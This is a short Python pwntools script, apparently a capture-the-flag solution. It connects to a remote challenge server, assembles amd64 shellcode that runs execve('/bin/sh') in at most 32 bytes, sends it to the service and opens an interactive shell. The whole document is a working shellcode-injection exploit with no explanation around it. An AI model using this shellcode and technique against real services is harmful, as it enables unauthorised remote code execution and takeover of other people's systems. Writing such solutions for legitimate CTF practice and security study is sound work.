from pwn import *

context.log_level="debug"

r=remote("pwn.sixstars.team","23600")

sh = """
    call here
    .ascii "/bin/sh"
    .byte 0
here:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
"""

shellcode = asm(sh,arch="amd64")
assert len(shellcode) <= 0x20
r.recv()
r.sendline(shellcode)

r.interactive()

